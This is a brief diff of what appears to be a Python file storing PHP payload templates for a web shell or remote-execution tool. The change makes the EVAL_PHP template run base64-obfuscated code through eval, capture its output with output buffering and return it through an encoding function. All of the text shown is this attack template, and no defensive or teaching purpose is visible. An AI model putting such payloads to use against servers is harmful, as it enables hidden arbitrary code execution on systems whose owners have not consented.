@@ -212,7 +212,11 @@ decoder_echo(base64_encode($content));
 """
 
 EVAL_PHP = """
+ob_start();
 eval(base64_decode({code_b64}));
+$content = ob_get_contents();
+ob_end_clean();
+decoder_echo($content);
 """
 
 PAYLOAD_SESSIONIZE = """
